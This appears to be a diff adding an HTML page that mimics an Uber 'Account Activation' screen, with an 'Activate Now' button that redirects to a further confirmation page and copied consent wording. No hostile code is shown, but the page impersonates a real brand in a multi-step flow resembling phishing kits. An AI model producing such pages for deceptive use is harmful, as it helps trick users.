@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Activation</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            font-family: Arial, sans-serif;
+            height: 100%;
+        }
+        .top-bar {
+            background-color: black;
+            height: 1.5cm;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+        .top-bar h1 {
+            color: white;
+            font-size: 2rem;
+            font-weight: 500;
+            margin: 0;
+        }
+        .content {
+            text-align: center;
+            font-size: 1.5rem;
+            color: black;
+            padding: 20px;
+        }
+        .success-message {
+            font-size: 2rem;
+            font-weight: bold;
+            color: green;
+            margin: 20px 0;
+        }
+        .instructions {
+            font-size: 1.2rem;
+            margin: 20px 0;
+            color: black;
+        }
+        .activation-button {
+            margin-top: 30px;
+            background-color: black;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1.5rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .activation-button:hover {
+            background-color: #555;
+        }
+        .footer {
+            margin-top: 50px;
+            padding: 20px;
+            background-color: #f2f2f2;
+            color: #808080;
+            text-align: left;
+            font-size: 1rem;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <h1>Uber</h1>
+    </div>
+    <div class="content">
+        <h2>Account Activation</h2>
+        <p class="success-message">
+            Your account is now ready for activation!
+        </p>
+        <p class="instructions">
+            Please click the button below to complete your activation process.
+        </p>
+        <button class="activation-button" onclick="redirectToFinal()">Activate Now</button>
+    </div>
+    <div class="footer">
+        By proceeding, you consent to receiving calls, WhatsApp, or SMS/RCS messages, including by automated means, from Uber and its affiliates to the number provided.
+    </div>
+    <script>
+        function redirectToFinal() {
+            // Redirect to the final confirmation page
+            window.location.href = "final_activation_confirmation.html"; // Update this with the final page URL
+        }
+    </script>
+</body>
+</html>
